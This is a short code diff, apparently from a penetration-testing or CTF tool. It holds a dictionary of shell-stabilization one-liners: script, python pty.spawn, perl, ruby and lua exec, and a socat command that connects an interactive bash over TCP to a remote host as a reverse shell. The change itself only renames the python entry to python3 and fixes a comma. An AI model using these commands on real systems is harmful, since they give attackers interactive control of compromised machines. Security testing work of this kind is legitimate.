@@ -14,11 +14,11 @@ shell = "/bin/bash"
 stabilization_methods = {
     "script": f"/usr/bin/script -qc {shell} /dev/null",
     "socat": f"/usr/bin/socat exec:'{shell} -li',pty,stderr,setsid,sigint,sane tcp-connect:",
-    "python": f"python -c 'import pty; pty.spawn(\"{shell}\")'",
+    "python3": f"python3 -c 'import pty; pty.spawn(\"{shell}\")'",
     "perl": f"perl -e 'exec \"{shell}\";'",
     "ruby": f"ruby -e 'exec \"{shell}\";'",
     "lua": f"lua -e 'os.execute(\"{shell}\")'",
-    "echo": f"echo os.system('{shell}')",
+    "echo": f"echo os.system('{shell}')"
 }
 
 
